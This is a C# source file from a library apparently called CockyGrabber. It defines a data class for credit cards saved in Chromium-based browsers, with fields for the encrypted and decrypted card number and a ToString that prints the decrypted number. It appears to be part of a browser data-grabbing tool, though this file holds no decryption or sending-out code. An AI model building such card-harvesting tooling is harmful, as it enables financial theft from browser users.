using CockyGrabber.Utility;
using System;

namespace CockyGrabber
{
    public static partial class Blink
    {
        public class CreditCard
        {
            public enum Header
            {
                guid,
                name_on_card,
                expiration_month,
                expiration_year,
                card_number_encrypted,
                date_modified,
                origin,
                use_count,
                use_date,
                billing_address_id,
                nickname,
            }

            /// <summary>
            /// The guid of the credit card.
            /// </summary>
            public string Guid { get; set; }
            /// <summary>
            /// The name on the credit card.
            /// </summary>
            public string NameOnCard { get; set; }
            /// <summary>
            /// The expiration month of the credit card.
            /// </summary>
            public short ExpirationMonth { get; set; }
            /// <summary>
            /// The expiration year of the credit card.
            /// </summary>
            public short ExpirationYear { get; set; }
            /// <summary>
            /// The encrypted credit card number.
            /// </summary>
            public byte[] CardNumberEncrypted { get; set; }
            /// <summary>
            /// The decrypted credit card number.
            /// </summary>
            public string CardNumberDecrypted { get; set; }
            /// <summary>
            /// The date on which it was last modified.
            /// </summary>
            public DateTimeOffset DateModified { get; set; }
            /// <summary>
            /// The credit card's origin. (The place from where it was created)
            /// </summary>
            public string Origin { get; set; }
            /// <summary>
            /// Times the credit card was used.
            /// </summary>
            public int UseCount { get; set; }
            /// <summary>
            /// The date on which the credit card was last used.
            /// </summary>
            public DateTimeOffset UseDate { get; set; }
            /// <summary>
            /// The credit card's billing address id
            /// </summary>
            public string BillingAddressId { get; set; }
            /// <summary>
            /// The credit card's nickname
            /// </summary>
            public string Nickname { get; set; }

            public override string ToString() => $"NameOnCard = '{NameOnCard}' | ExpirationMonth = '{ExpirationMonth}' | ExpirationYear = '{ExpirationYear}' | CardNumberDecrypted = '{CardNumberDecrypted}'";
            public string ToJson() => Tools.BrowserInformationToJson(this);
        }
    }
}
